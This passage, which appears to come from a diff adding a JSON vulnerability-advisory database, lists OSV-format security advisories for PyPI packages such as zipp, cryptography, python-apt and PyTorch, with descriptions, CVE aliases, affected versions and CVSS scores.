+        "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      }
+    ]
+  },
+  {
+    "id": "GHSA-jfmj-5v4g-7637",
+    "summary": "zipp Denial of Service vulnerability",
+    "details": "A Denial of Service (DoS) vulnerability exists in the jaraco/zipp library, affecting all versions prior to 3.19.1. The vulnerability is triggered when processing a specially crafted zip file that leads to an infinite loop. This issue also impacts the zipfile module of CPython, as features from the third-party zipp library are later merged into CPython, and the affected code is identical in both projects. The infinite loop can be initiated through the use of functions affecting the `Path` module in both zipp and zipfile, such as `joinpath`, the overloaded division operator, and `iterdir`. Although the infinite loop is not resource exhaustive, it prevents the application from responding. The vulnerability was addressed in version 3.19.1 of jaraco/zipp.",
+    "aliases": [
+      "CVE-2024-5569",
+      "PYSEC-2026-2074"
+    ],
+    "modified": "2026-09-10T03:49:18.747455573Z",
+    "published": "2024-07-09T00:31:40Z",
+    "database_specific": {
+      "github_reviewed_at": "2024-07-09T17:25:54Z",
+      "nvd_published_at": "2024-07-09T00:15:02Z",
+      "cwe_ids": [
+        "CWE-400",
+        "CWE-835"
+      ],
+      "severity": "MODERATE",
+      "github_reviewed": true
+    },
+    "references": [
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-5569"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/jaraco/zipp/commit/fd604bd34f0343472521a36da1fbd22e793e14fd"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/jaraco/zipp"
+      },
+      {
+        "type": "WEB",
+        "url": "https://huntr.com/bounties/be898306-11f9-46b4-b28c-f4c4aa4ffbae"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "zipp",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/zipp"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "3.19.1"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "0.1.0",
+          "0.2.0",
+          "0.2.1",
+          "0.3.0",
+          "0.3.1",
+          "0.3.2",
+          "0.3.3",
+          "0.4.0",
+          "0.5.0",
+          "0.5.1",
+          "0.5.2",
+          "0.6.0",
+          "1.0.0",
+          "1.1.0",
+          "1.1.1",
+          "1.2.0",
+          "2.0.0",
+          "2.0.1",
+          "2.1.0",
+          "2.2.0",
+          "2.2.1",
+          "3.0.0",
+          "3.1.0",
+          "3.10.0",
+          "3.11.0",
+          "3.12.0",
+          "3.12.1",
+          "3.13.0",
+          "3.14.0",
+          "3.15.0",
+          "3.16.0",
+          "3.16.1",
+          "3.16.2",
+          "3.17.0",
+          "3.18.0",
+          "3.18.1",
+          "3.18.2",
+          "3.19.0",
+          "3.2.0",
+          "3.3.0",
+          "3.3.1",
+          "3.3.2",
+          "3.4.0",
+          "3.4.1",
+          "3.4.2",
+          "3.5.0",
+          "3.5.1",
+          "3.6.0",
+          "3.7.0",
+          "3.8.0",
+          "3.8.1",
+          "3.9.0",
+          "3.9.1"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/07/GHSA-jfmj-5v4g-7637/GHSA-jfmj-5v4g-7637.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+      }
+    ]
+  },
+  {
+    "id": "GHSA-jm77-qphf-c4w8",
+    "summary": "pyca/cryptography's wheels include vulnerable OpenSSL",
+    "details": "pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8-41.0.2 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230731.txt, https://www.openssl.org/news/secadv/20230719.txt, and https://www.openssl.org/news/secadv/20230714.txt.\n\nIf you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",
+    "modified": "2026-09-10T03:50:02.832467975Z",
+    "published": "2023-08-01T22:34:41Z",
+    "database_specific": {
+      "github_reviewed": true,
+      "github_reviewed_at": "2023-08-01T22:34:41Z",
+      "nvd_published_at": null,
+      "cwe_ids": [],
+      "severity": "LOW"
+    },
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-jm77-qphf-c4w8"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pyca/cryptography/commit/b22271cf3c3dd8dc8978f8f4b00b5c7060b6538d"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pyca/cryptography/commit/bfa4d95f0f356f2d535efd5c775e0fb3efe90ef2"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/pyca/cryptography"
+      },
+      {
+        "type": "WEB",
+        "url": "https://www.openssl.org/news/secadv/20230714.txt"
+      },
+      {
+        "type": "WEB",
+        "url": "https://www.openssl.org/news/secadv/20230719.txt"
+      },
+      {
+        "type": "WEB",
+        "url": "https://www.openssl.org/news/secadv/20230731.txt"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "cryptography",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/cryptography"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0.8"
+              },
+              {
+                "fixed": "41.0.3"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "0.8",
+          "0.8.1",
+          "0.8.2",
+          "0.9",
+          "0.9.1",
+          "0.9.2",
+          "0.9.3",
+          "1.0",
+          "1.0.1",
+          "1.0.2",
+          "1.1",
+          "1.1.1",
+          "1.1.2",
+          "1.2",
+          "1.2.1",
+          "1.2.2",
+          "1.2.3",
+          "1.3",
+          "1.3.1",
+          "1.3.2",
+          "1.3.3",
+          "1.3.4",
+          "1.4",
+          "1.5",
+          "1.5.1",
+          "1.5.2",
+          "1.5.3",
+          "1.6",
+          "1.7",
+          "1.7.1",
+          "1.7.2",
+          "1.8",
+          "1.8.1",
+          "1.8.2",
+          "1.9",
+          "2.0",
+          "2.0.1",
+          "2.0.2",
+          "2.0.3",
+          "2.1",
+          "2.1.1",
+          "2.1.2",
+          "2.1.3",
+          "2.1.4",
+          "2.2",
+          "2.2.1",
+          "2.2.2",
+          "2.3",
+          "2.3.1",
+          "2.4",
+          "2.4.1",
+          "2.4.2",
+          "2.5",
+          "2.6",
+          "2.6.1",
+          "2.7",
+          "2.8",
+          "2.9",
+          "2.9.1",
+          "2.9.2",
+          "3.0",
+          "3.1",
+          "3.1.1",
+          "3.2",
+          "3.2.1",
+          "3.3",
+          "3.3.1",
+          "3.3.2",
+          "3.4",
+          "3.4.1",
+          "3.4.2",
+          "3.4.3",
+          "3.4.4",
+          "3.4.5",
+          "3.4.6",
+          "3.4.7",
+          "3.4.8",
+          "35.0.0",
+          "36.0.0",
+          "36.0.1",
+          "36.0.2",
+          "37.0.0",
+          "37.0.1",
+          "37.0.2",
+          "37.0.3",
+          "37.0.4",
+          "38.0.0",
+          "38.0.1",
+          "38.0.2",
+          "38.0.3",
+          "38.0.4",
+          "39.0.0",
+          "39.0.1",
+          "39.0.2",
+          "40.0.0",
+          "40.0.1",
+          "40.0.2",
+          "41.0.0",
+          "41.0.1",
+          "41.0.2"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/08/GHSA-jm77-qphf-c4w8/GHSA-jm77-qphf-c4w8.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0"
+  },
+  {
+    "id": "GHSA-m959-cc7f-wv43",
+    "summary": "cryptography has incomplete DNS name constraint enforcement on peer names",
+    "details": "## Summary\n\nIn versions of cryptography prior to 46.0.5, DNS name constraints were only validated against SANs within child certificates, and not the \"peer name\" presented during each validation. Consequently, cryptography would allow a peer named `bar.example.com` to validate against a wildcard leaf certificate for `*.example.com`, even if the leaf's parent certificate (or upwards) contained an excluded subtree constraint for `bar.example.com`.\n\nThis behavior resulted from a gap between RFC 5280 (which defines Name Constraint semantics) and RFC 9525 (which defines service identity semantics): put together, neither states definitively whether Name Constraints should be applied to peer names. To close this gap, cryptography now conservatively rejects any validation where the peer name would be rejected by a name constraint if it were a SAN instead.\n\nIn practice, exploitation of this bypass requires an uncommon X.509 topology, one that the Web PKI avoids because it exhibits these kinds of problems. Consequently, we consider this a medium-to-low impact severity.\n\nSee CVE-2025-61727 for a similar bypass in Go's `crypto/x509`.\n\n## Remediation\n\nUsers should upgrade to 46.0.6 or newer. \n\n## Attribution\n\nReporter: @1seal",
+    "aliases": [
+      "CVE-2026-34073",
+      "PYSEC-2026-35"
+    ],
+    "modified": "2026-09-10T03:51:00.592317622Z",
+    "published": "2026-03-27T19:56:21Z",
+    "database_specific": {
+      "github_reviewed_at": "2026-03-27T19:56:21Z",
+      "nvd_published_at": "2026-03-31T03:15:59Z",
+      "cwe_ids": [
+        "CWE-295"
+      ],
+      "severity": "LOW",
+      "github_reviewed": true
+    },
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-m959-cc7f-wv43"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-34073"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/pyca/cryptography"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pypa/advisory-database/tree/main/vulns/cryptography/PYSEC-2026-35.yaml"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "cryptography",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/cryptography"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "46.0.6"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "0.1",
+          "0.2",
+          "0.2.1",
+          "0.2.2",
+          "0.3",
+          "0.4",
+          "0.5",
+          "0.5.1",
+          "0.5.2",
+          "0.5.3",
+          "0.5.4",
+          "0.6",
+          "0.6.1",
+          "0.7",
+          "0.7.1",
+          "0.7.2",
+          "0.8",
+          "0.8.1",
+          "0.8.2",
+          "0.9",
+          "0.9.1",
+          "0.9.2",
+          "0.9.3",
+          "1.0",
+          "1.0.1",
+          "1.0.2",
+          "1.1",
+          "1.1.1",
+          "1.1.2",
+          "1.2",
+          "1.2.1",
+          "1.2.2",
+          "1.2.3",
+          "1.3",
+          "1.3.1",
+          "1.3.2",
+          "1.3.3",
+          "1.3.4",
+          "1.4",
+          "1.5",
+          "1.5.1",
+          "1.5.2",
+          "1.5.3",
+          "1.6",
+          "1.7",
+          "1.7.1",
+          "1.7.2",
+          "1.8",
+          "1.8.1",
+          "1.8.2",
+          "1.9",
+          "2.0",
+          "2.0.1",
+          "2.0.2",
+          "2.0.3",
+          "2.1",
+          "2.1.1",
+          "2.1.2",
+          "2.1.3",
+          "2.1.4",
+          "2.2",
+          "2.2.1",
+          "2.2.2",
+          "2.3",
+          "2.3.1",
+          "2.4",
+          "2.4.1",
+          "2.4.2",
+          "2.5",
+          "2.6",
+          "2.6.1",
+          "2.7",
+          "2.8",
+          "2.9",
+          "2.9.1",
+          "2.9.2",
+          "3.0",
+          "3.1",
+          "3.1.1",
+          "3.2",
+          "3.2.1",
+          "3.3",
+          "3.3.1",
+          "3.3.2",
+          "3.4",
+          "3.4.1",
+          "3.4.2",
+          "3.4.3",
+          "3.4.4",
+          "3.4.5",
+          "3.4.6",
+          "3.4.7",
+          "3.4.8",
+          "35.0.0",
+          "36.0.0",
+          "36.0.1",
+          "36.0.2",
+          "37.0.0",
+          "37.0.1",
+          "37.0.2",
+          "37.0.3",
+          "37.0.4",
+          "38.0.0",
+          "38.0.1",
+          "38.0.2",
+          "38.0.3",
+          "38.0.4",
+          "39.0.0",
+          "39.0.1",
+          "39.0.2",
+          "40.0.0",
+          "40.0.1",
+          "40.0.2",
+          "41.0.0",
+          "41.0.1",
+          "41.0.2",
+          "41.0.3",
+          "41.0.4",
+          "41.0.5",
+          "41.0.6",
+          "41.0.7",
+          "42.0.0",
+          "42.0.1",
+          "42.0.2",
+          "42.0.3",
+          "42.0.4",
+          "42.0.5",
+          "42.0.6",
+          "42.0.7",
+          "42.0.8",
+          "43.0.0",
+          "43.0.1",
+          "43.0.3",
+          "44.0.0",
+          "44.0.1",
+          "44.0.2",
+          "44.0.3",
+          "45.0.0",
+          "45.0.1",
+          "45.0.2",
+          "45.0.3",
+          "45.0.4",
+          "45.0.5",
+          "45.0.6",
+          "45.0.7",
+          "46.0.0",
+          "46.0.1",
+          "46.0.2",
+          "46.0.3",
+          "46.0.4",
+          "46.0.5"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-m959-cc7f-wv43/GHSA-m959-cc7f-wv43.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:U"
+      }
+    ]
+  },
+  {
+    "id": "GHSA-pj65-3pf6-c5q4",
+    "summary": "python-apt Does Not Check Hash Signature",
+    "details": "Python-apt doesn't check if hashes are signed in `Version.fetch_binary()` and `Version.fetch_source()` of apt/package.py or in `_fetch_archives()` of apt/cache.py in version 1.9.3ubuntu2 and earlier. This allows downloads from unsigned repositories which shouldn't be allowed and has been fixed in verisions 1.9.5, 1.9.0ubuntu1.2, 1.6.5ubuntu0.1, 1.1.0~beta1ubuntu0.16.04.7, 0.9.3.5ubuntu3+esm2, and 0.8.3ubuntu7.5.",
+    "aliases": [
+      "CVE-2019-15796"
+    ],
+    "modified": "2023-11-08T04:01:15.371344Z",
+    "published": "2022-05-24T17:12:47Z",
+    "database_specific": {
+      "github_reviewed_at": "2023-07-18T22:36:38Z",
+      "nvd_published_at": "2020-03-26T13:15:00Z",
+      "cwe_ids": [
+        "CWE-347"
+      ],
+      "severity": "MODERATE",
+      "github_reviewed": true
+    },
+    "references": [
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-15796"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/excid3/python-apt"
+      },
+      {
+        "type": "WEB",
+        "url": "https://usn.ubuntu.com/4247-1"
+      },
+      {
+        "type": "WEB",
+        "url": "https://usn.ubuntu.com/4247-3"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "python-apt",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/python-apt"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "0.8.3ubuntu7.5"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-pj65-3pf6-c5q4/GHSA-pj65-3pf6-c5q4.json"
+        }
+      },
+      {
+        "package": {
+          "name": "python-apt",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/python-apt"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0.9.0"
+              },
+              {
+                "fixed": "0.9.3.5ubuntu3"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-pj65-3pf6-c5q4/GHSA-pj65-3pf6-c5q4.json"
+        }
+      },
+      {
+        "package": {
+          "name": "python-apt",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/python-apt"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "1.2.0"
+              },
+              {
+                "fixed": "1.6.5ubuntu0.1"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-pj65-3pf6-c5q4/GHSA-pj65-3pf6-c5q4.json"
+        }
+      },
+      {
+        "package": {
+          "name": "python-apt",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/python-apt"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "1.7.0"
+              },
+              {
+                "fixed": "1.9.0ubuntu1.2"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-pj65-3pf6-c5q4/GHSA-pj65-3pf6-c5q4.json"
+        }
+      },
+      {
+        "package": {
+          "name": "python-apt",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/python-apt"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "1.9.1"
+              },
+              {
+                "fixed": "1.9.5"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-pj65-3pf6-c5q4/GHSA-pj65-3pf6-c5q4.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      }
+    ]
+  },
+  {
+    "id": "GHSA-r6ph-v2qm-q3c2",
+    "summary": "cryptography Vulnerable to a Subgroup Attack Due to Missing Subgroup Validation for SECT Curves",
+    "details": "## Vulnerability Summary\n\nThe `public_key_from_numbers` (or `EllipticCurvePublicNumbers.public_key()`), `EllipticCurvePublicNumbers.public_key()`, `load_der_public_key()` and `load_pem_public_key()` functions do not verify that the point belongs to the expected prime-order subgroup of the curve.\n\nThis missing validation allows an attacker to provide a public key point `P` from a small-order subgroup.  This can lead to security issues in various situations, such as the most commonly used signature verification (ECDSA) and shared key negotiation (ECDH). When the victim computes the shared secret as `S = [victim_private_key]P` via ECDH,  this leaks information about `victim_private_key mod (small_subgroup_order)`. For curves with cofactor > 1, this reveals the least significant bits of the private key.  When these weak public keys are used in ECDSA , it's easy to forge signatures on the small subgroup.\n\nOnly SECT curves are impacted by this.\n\n## Credit\n\nThis vulnerability was discovered by:\n- XlabAI Team of Tencent Xuanwu Lab\n- Atuin Automated Vulnerability Discovery Engine",
+    "aliases": [
+      "CVE-2026-26007",
+      "PYSEC-2026-2141"
+    ],
+    "modified": "2026-09-10T03:50:59.750965345Z",
+    "published": "2026-02-10T21:27:06Z",
+    "database_specific": {
+      "severity": "HIGH",
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-02-10T21:27:06Z",
+      "nvd_published_at": "2026-02-10T22:17:00Z",
+      "cwe_ids": [
+        "CWE-345"
+      ]
+    },
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-r6ph-v2qm-q3c2"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-26007"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pyca/cryptography/commit/0eebb9dbb6343d9bc1d91e5a2482ed4e054a6d8c"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/pyca/cryptography"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pyca/cryptography/releases/tag/46.0.5"
+      },
+      {
+        "type": "WEB",
+        "url": "http://www.openwall.com/lists/oss-security/2026/02/10/4"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "cryptography",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/cryptography"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "46.0.5"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "0.1",
+          "0.2",
+          "0.2.1",
+          "0.2.2",
+          "0.3",
+          "0.4",
+          "0.5",
+          "0.5.1",
+          "0.5.2",
+          "0.5.3",
+          "0.5.4",
+          "0.6",
+          "0.6.1",
+          "0.7",
+          "0.7.1",
+          "0.7.2",
+          "0.8",
+          "0.8.1",
+          "0.8.2",
+          "0.9",
+          "0.9.1",
+          "0.9.2",
+          "0.9.3",
+          "1.0",
+          "1.0.1",
+          "1.0.2",
+          "1.1",
+          "1.1.1",
+          "1.1.2",
+          "1.2",
+          "1.2.1",
+          "1.2.2",
+          "1.2.3",
+          "1.3",
+          "1.3.1",
+          "1.3.2",
+          "1.3.3",
+          "1.3.4",
+          "1.4",
+          "1.5",
+          "1.5.1",
+          "1.5.2",
+          "1.5.3",
+          "1.6",
+          "1.7",
+          "1.7.1",
+          "1.7.2",
+          "1.8",
+          "1.8.1",
+          "1.8.2",
+          "1.9",
+          "2.0",
+          "2.0.1",
+          "2.0.2",
+          "2.0.3",
+          "2.1",
+          "2.1.1",
+          "2.1.2",
+          "2.1.3",
+          "2.1.4",
+          "2.2",
+          "2.2.1",
+          "2.2.2",
+          "2.3",
+          "2.3.1",
+          "2.4",
+          "2.4.1",
+          "2.4.2",
+          "2.5",
+          "2.6",
+          "2.6.1",
+          "2.7",
+          "2.8",
+          "2.9",
+          "2.9.1",
+          "2.9.2",
+          "3.0",
+          "3.1",
+          "3.1.1",
+          "3.2",
+          "3.2.1",
+          "3.3",
+          "3.3.1",
+          "3.3.2",
+          "3.4",
+          "3.4.1",
+          "3.4.2",
+          "3.4.3",
+          "3.4.4",
+          "3.4.5",
+          "3.4.6",
+          "3.4.7",
+          "3.4.8",
+          "35.0.0",
+          "36.0.0",
+          "36.0.1",
+          "36.0.2",
+          "37.0.0",
+          "37.0.1",
+          "37.0.2",
+          "37.0.3",
+          "37.0.4",
+          "38.0.0",
+          "38.0.1",
+          "38.0.2",
+          "38.0.3",
+          "38.0.4",
+          "39.0.0",
+          "39.0.1",
+          "39.0.2",
+          "40.0.0",
+          "40.0.1",
+          "40.0.2",
+          "41.0.0",
+          "41.0.1",
+          "41.0.2",
+          "41.0.3",
+          "41.0.4",
+          "41.0.5",
+          "41.0.6",
+          "41.0.7",
+          "42.0.0",
+          "42.0.1",
+          "42.0.2",
+          "42.0.3",
+          "42.0.4",
+          "42.0.5",
+          "42.0.6",
+          "42.0.7",
+          "42.0.8",
+          "43.0.0",
+          "43.0.1",
+          "43.0.3",
+          "44.0.0",
+          "44.0.1",
+          "44.0.2",
+          "44.0.3",
+          "45.0.0",
+          "45.0.1",
+          "45.0.2",
+          "45.0.3",
+          "45.0.4",
+          "45.0.5",
+          "45.0.6",
+          "45.0.7",
+          "46.0.0",
+          "46.0.1",
+          "46.0.2",
+          "46.0.3",
+          "46.0.4"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-r6ph-v2qm-q3c2/GHSA-r6ph-v2qm-q3c2.json",
+          "last_known_affected_version_range": "<= 46.0.4"
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X"
+      }
+    ]
+  },
+  {
+    "id": "GHSA-rp8m-h266-53jh",
+    "summary": "python-apt Flawed Package Integrity Check",
+    "details": "python-apt only checks the MD5 sums of downloaded files in `Version.fetch_binary()` and `Version.fetch_source()` of apt/package.py in version 1.9.0ubuntu1 and earlier. This allows a man-in-the-middle attack which could potentially be used to install altered packages and has been fixed in versions 1.9.0ubuntu1.2, 1.6.5ubuntu0.1, 1.1.0~beta1ubuntu0.16.04.7, 0.9.3.5ubuntu3+esm2, and 0.8.3ubuntu7.5.",
+    "aliases": [
+      "CVE-2019-15795"
+    ],
+    "modified": "2023-11-08T04:01:15.311543Z",
+    "published": "2022-05-24T17:12:47Z",
+    "database_specific": {
+      "nvd_published_at": "2020-03-26T13:15:00Z",
+      "cwe_ids": [
+        "CWE-327"
+      ],
+      "severity": "MODERATE",
+      "github_reviewed": true,
+      "github_reviewed_at": "2023-07-18T22:34:38Z"
+    },
+    "references": [
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-15795"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/excid3/python-apt"
+      },
+      {
+        "type": "WEB",
+        "url": "https://usn.ubuntu.com/4247-1"
+      },
+      {
+        "type": "WEB",
+        "url": "https://usn.ubuntu.com/4247-3"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "python-apt",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/python-apt"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "0.8.3ubuntu7.5"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-rp8m-h266-53jh/GHSA-rp8m-h266-53jh.json"
+        }
+      },
+      {
+        "package": {
+          "name": "python-apt",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/python-apt"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0.9.0"
+              },
+              {
+                "fixed": "0.9.3.5ubuntu3"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-rp8m-h266-53jh/GHSA-rp8m-h266-53jh.json"
+        }
+      },
+      {
+        "package": {
+          "name": "python-apt",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/python-apt"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "1.0.0"
+              },
+              {
+                "fixed": "1.1.0"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-rp8m-h266-53jh/GHSA-rp8m-h266-53jh.json"
+        }
+      },
+      {
+        "package": {
+          "name": "python-apt",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/python-apt"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "1.2.0"
+              },
+              {
+                "fixed": "1.6.5ubuntu0.1"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-rp8m-h266-53jh/GHSA-rp8m-h266-53jh.json"
+        }
+      },
+      {
+        "package": {
+          "name": "python-apt",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/python-apt"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "1.7.0"
+              },
+              {
+                "fixed": "1.9.0ubuntu1.2"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-rp8m-h266-53jh/GHSA-rp8m-h266-53jh.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      }
+    ]
+  },
+  {
+    "id": "GHSA-rrmf-rvhw-rf47",
+    "summary": "PyTorch is vulnerable to memory corruption through its torch.jit.script function",
+    "details": "A vulnerability classified as critical has been found in PyTorch 2.6.0. This affects the function torch.jit.script. The manipulation leads to memory corruption. It is possible to launch the attack on the local host. The exploit has been disclosed to the public and may be used.",
+    "aliases": [
+      "BIT-pytorch-2025-3000",
+      "CVE-2025-3000",
+      "PYSEC-2025-194"
+    ],
+    "modified": "2026-09-10T03:49:48.419046410Z",
+    "published": "2025-03-31T15:30:48Z",
+    "database_specific": {
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-06-10T18:02:14Z",
+      "nvd_published_at": "2025-03-31T15:15:46Z",
+      "cwe_ids": [
+        "CWE-119"
+      ],
+      "severity": "LOW"
+    },
+    "references": [
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-3000"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pytorch/pytorch/issues/149623"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pytorch/pytorch/issues/149623#issue-2935703015"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pytorch/pytorch/commit/b90c94991cdf8b87c8f7439f79518e0ef2c4ca4f"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pypa/advisory-database/tree/main/vulns/torch/PYSEC-2025-194.yaml"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/pytorch/pytorch"
+      },
+      {
+        "type": "WEB",
+        "url": "https://vuldb.com/?ctiid.302049"
+      },
+      {
